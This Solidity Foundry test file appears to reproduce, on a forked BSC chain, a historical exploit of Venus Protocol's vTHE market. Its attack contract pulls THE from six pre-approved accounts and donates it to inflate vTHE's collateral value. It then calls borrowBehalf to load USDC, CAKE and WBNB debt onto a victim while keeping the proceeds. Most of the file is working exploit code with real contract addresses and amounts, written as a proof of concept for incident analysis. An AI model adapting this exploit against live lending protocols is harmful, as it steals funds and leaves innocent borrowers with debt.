// SPDX-License-Identifier: UNLICENSED
// @KeyInfo - Total Lost : still held as raw CAKE + WBNB at the end of the tx
// Attacker : https://bscscan.com/address/0x43C743e316F40d4511762EEdf6f6D484F67b2F82
// Attack Contract : https://bscscan.com/address/0x737bc98F1D34E19539C074B8Ad1169d5d45dA619
// Attack Tx : https://bscscan.com/tx/0x4f477e941c12bbf32a58dc12db7bb0cb4d31d41ff25b2457e6af3c15d7f5663f

// Trace-driven state changing path:
// 1. Drain THE from six EOAs that had pre-approved the future attack-contract address.
// 2. Donate those THE directly into Venus vTHE to inflate the market's exchange rate / collateral value.
// 3. Use Venus borrowBehalf to borrow USDC onto a victim's debt while sending the cash to the attacker.
// 4. Mint vUSDC with the stolen USDC, enter that market, then borrow THE and donate it back into vTHE.
// 5. Reuse the victim's now-overvalued vTHE collateral to borrow CAKE and WBNB on the victim's behalf.

pragma solidity ^0.8.15;

import "forge-std/Test.sol";

interface IERC20Minimal {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function transfer(
        address to,
        uint256 amount
    ) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    function approve(
        address spender,
        uint256 amount
    ) external returns (bool);
}

interface IVenusComptrollerLike {
    function enterMarkets(
        address[] calldata vTokens
    ) external returns (uint256[] memory);
}

interface IVenusVTokenLike {
    function mint(
        uint256 mintAmount
    ) external returns (uint256);
    function borrow(
        uint256 borrowAmount
    ) external returns (uint256);
    function borrowBehalf(
        address borrower,
        uint256 borrowAmount
    ) external returns (uint256);
    function borrowBalanceStored(
        address account
    ) external view returns (uint256);
}

interface IEtchedAttackEntry {
    function attack() external;
}


contract Venus_vTHE_BorrowBehalf_Test is Test {
    string internal constant BSC_ARCHIVE_RPC = "https://bsc-mainnet.public.blastapi.io";

    address internal constant ATTACKER_EOA = 0x43C743e316F40d4511762EEdf6f6D484F67b2F82;
    address internal constant ATTACK_CONTRACT = 0x737bc98F1D34E19539C074B8Ad1169d5d45dA619;
    address internal constant VICTIM = 0x1A35bD28EFD46CfC46c2136f878777D69ae16231;

    uint256 internal constant ATTACK_BLOCK = 86_731_941;
    uint256 internal constant FORK_BLOCK = ATTACK_BLOCK - 1;

    uint256 internal constant THE_DONATION_TOTAL = 36_096_716_105_623_166_306_174_220;
    uint256 internal constant USDC_BORROW_AMOUNT = 1_581_454_956_604_046_563_770_845;
    uint256 internal constant THE_SELF_BORROW_AMOUNT = 4_628_903_900_747_323_154_634_598;
    uint256 internal constant CAKE_BORROW_AMOUNT = 913_858_263_360_521_396_654_198;
    uint256 internal constant WBNB_BORROW_AMOUNT = 1_972_530_910_582_753_621_682;

    IERC20Minimal internal constant USDC = IERC20Minimal(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    IERC20Minimal internal constant THE = IERC20Minimal(0xF4C8E32EaDEC4BFe97E0F595AdD0f4450a863a11);
    IERC20Minimal internal constant CAKE = IERC20Minimal(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);
    IERC20Minimal internal constant WBNB = IERC20Minimal(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    IVenusComptrollerLike internal constant COMPTROLLER =
        IVenusComptrollerLike(0xfD36E2c2a6789Db23113685031d7F16329158384);
    IVenusVTokenLike internal constant VUSDC = IVenusVTokenLike(0xecA88125a5ADbe82614ffC12D0DB554E2e2867C8);
    IVenusVTokenLike internal constant VTHE = IVenusVTokenLike(0x86e06EAfa6A1eA631Eab51DE500E3D474933739f);
    IVenusVTokenLike internal constant VCAKE = IVenusVTokenLike(0x86aC3974e2BD0d60825230fa6F355fF11409df5c);
    IVenusVTokenLike internal constant VWBNB = IVenusVTokenLike(0x6bCa74586218dB34cdB402295796b79663d816e9);

    function setUp() public {
        vm.createSelectFork(BSC_ARCHIVE_RPC, FORK_BLOCK);

        vm.label(ATTACKER_EOA, "attacker EOA");
        vm.label(ATTACK_CONTRACT, "historical attack contract");
        vm.label(VICTIM, "victim");
        vm.label(address(COMPTROLLER), "Venus Comptroller");
        vm.label(address(USDC), "USDC");
        vm.label(address(THE), "THENA");
        vm.label(address(CAKE), "CAKE");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(VUSDC), "vUSDC");
        vm.label(address(VTHE), "vTHE");
        vm.label(address(VCAKE), "vCAKE");
        vm.label(address(VWBNB), "vWBNB");
    }

    function testTraceDrivenPoC() public {
        assertEq(ATTACK_CONTRACT.code.length, 0, "attack contract should not exist before the creation tx");

        uint256 attackerCakeBefore = CAKE.balanceOf(ATTACK_CONTRACT);
        uint256 attackerWbnbBefore = WBNB.balanceOf(ATTACK_CONTRACT);
        uint256 vTheCashBefore = THE.balanceOf(address(VTHE));
        uint256 victimUsdcDebtBefore = VUSDC.borrowBalanceStored(VICTIM);
        uint256 victimCakeDebtBefore = VCAKE.borrowBalanceStored(VICTIM);
        uint256 victimWbnbDebtBefore = VWBNB.borrowBalanceStored(VICTIM);

        VenusVtheBorrowBehalfRuntime template = new VenusVtheBorrowBehalfRuntime();
        vm.etch(ATTACK_CONTRACT, address(template).code);

        vm.prank(ATTACKER_EOA);
        IEtchedAttackEntry(ATTACK_CONTRACT).attack();

        uint256 attackerCakeAfter = CAKE.balanceOf(ATTACK_CONTRACT);
        uint256 attackerWbnbAfter = WBNB.balanceOf(ATTACK_CONTRACT);

        emit log_named_decimal_uint("attack contract CAKE before", attackerCakeBefore, 18);
        emit log_named_decimal_uint("attack contract CAKE after", attackerCakeAfter, 18);
        emit log_named_decimal_uint("attack contract CAKE profit", attackerCakeAfter - attackerCakeBefore, 18);
        emit log_named_decimal_uint("attack contract WBNB before", attackerWbnbBefore, 18);
        emit log_named_decimal_uint("attack contract WBNB after", attackerWbnbAfter, 18);
        emit log_named_decimal_uint("attack contract WBNB profit", attackerWbnbAfter - attackerWbnbBefore, 18);

        assertEq(attackerCakeAfter, CAKE_BORROW_AMOUNT, "unexpected CAKE profit");
        assertEq(attackerWbnbAfter, WBNB_BORROW_AMOUNT, "unexpected WBNB profit");
        assertGe(
            VUSDC.borrowBalanceStored(VICTIM) - victimUsdcDebtBefore,
            USDC_BORROW_AMOUNT,
            "victim USDC debt did not increase enough"
        );
        assertGe(
            VCAKE.borrowBalanceStored(VICTIM) - victimCakeDebtBefore,
            CAKE_BORROW_AMOUNT,
            "victim CAKE debt did not increase enough"
        );
        assertGe(
            VWBNB.borrowBalanceStored(VICTIM) - victimWbnbDebtBefore,
            WBNB_BORROW_AMOUNT,
            "victim WBNB debt did not increase enough"
        );
        assertEq(THE.balanceOf(address(VTHE)) - vTheCashBefore, THE_DONATION_TOTAL, "unexpected THE donated into vTHE");
    }
}

contract VenusVtheBorrowBehalfRuntime {
    address internal constant VICTIM = 0x1A35bD28EFD46CfC46c2136f878777D69ae16231;

    IERC20Minimal internal constant USDC = IERC20Minimal(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    IERC20Minimal internal constant THE = IERC20Minimal(0xF4C8E32EaDEC4BFe97E0F595AdD0f4450a863a11);

    IVenusComptrollerLike internal constant COMPTROLLER =
        IVenusComptrollerLike(0xfD36E2c2a6789Db23113685031d7F16329158384);
    IVenusVTokenLike internal constant VUSDC = IVenusVTokenLike(0xecA88125a5ADbe82614ffC12D0DB554E2e2867C8);
    IVenusVTokenLike internal constant VTHE = IVenusVTokenLike(0x86e06EAfa6A1eA631Eab51DE500E3D474933739f);
    IVenusVTokenLike internal constant VCAKE = IVenusVTokenLike(0x86aC3974e2BD0d60825230fa6F355fF11409df5c);
    IVenusVTokenLike internal constant VWBNB = IVenusVTokenLike(0x6bCa74586218dB34cdB402295796b79663d816e9);

    uint256 internal constant USDC_BORROW_AMOUNT = 1_581_454_956_604_046_563_770_845;
    uint256 internal constant THE_SELF_BORROW_AMOUNT = 4_628_903_900_747_323_154_634_598;
    uint256 internal constant CAKE_BORROW_AMOUNT = 913_858_263_360_521_396_654_198;
    uint256 internal constant WBNB_BORROW_AMOUNT = 1_972_530_910_582_753_621_682;

    function attack() external {
        _donateVictimApprovedTHE();

        require(VUSDC.borrowBehalf(VICTIM, USDC_BORROW_AMOUNT) == 0, "vUSDC borrowBehalf failed");
        require(USDC.approve(address(VUSDC), USDC_BORROW_AMOUNT), "USDC approve failed");
        require(VUSDC.mint(USDC_BORROW_AMOUNT) == 0, "vUSDC mint failed");

        address[] memory markets = new address[](1);
        markets[0] = address(VUSDC);
        uint256[] memory enterResults = COMPTROLLER.enterMarkets(markets);
        require(enterResults.length == 1 && enterResults[0] == 0, "enterMarkets failed");

        require(VTHE.borrow(THE_SELF_BORROW_AMOUNT) == 0, "vTHE borrow failed");
        require(THE.transfer(address(VTHE), THE_SELF_BORROW_AMOUNT), "THE self-donation failed");

        require(VCAKE.borrowBehalf(VICTIM, CAKE_BORROW_AMOUNT) == 0, "vCAKE borrowBehalf failed");
        require(VWBNB.borrowBehalf(VICTIM, WBNB_BORROW_AMOUNT) == 0, "vWBNB borrowBehalf failed");
    }

    function _donateVictimApprovedTHE() internal {
        require(
            THE.transferFrom(
                0xf052219F767612C411C9fE4a0F334237429c58AA, address(VTHE), 13_223_597_895_594_033_973_515_042
            ),
            "THE donor 0 failed"
        );
        require(
            THE.transferFrom(
                0x89E3615F356B3b40aCB2f8598117EAB1aFfddDB6, address(VTHE), 9_474_403_025_851_589_299_769_076
            ),
            "THE donor 1 failed"
        );
        require(
            THE.transferFrom(
                0xbb3782048735091AB4C304693a69371965A4ef87, address(VTHE), 7_532_701_864_690_234_166_374_687
            ),
            "THE donor 2 failed"
        );
        require(
            THE.transferFrom(
                0x564A073Fa4cfa81C2c882168fA760A88b82A4591, address(VTHE), 3_915_245_257_789_590_760_859_160
            ),
            "THE donor 3 failed"
        );
        require(THE.transferFrom(VICTIM, address(VTHE), 697_951_336_338_781_512_460_490), "THE donor 4 failed");
        require(
            THE.transferFrom(
                0x16f09B91604053E742eE0408909bAfA6a825bF07, address(VTHE), 1_252_816_725_358_936_593_195_765
            ),
            "THE donor 5 failed"
        );
    }
}
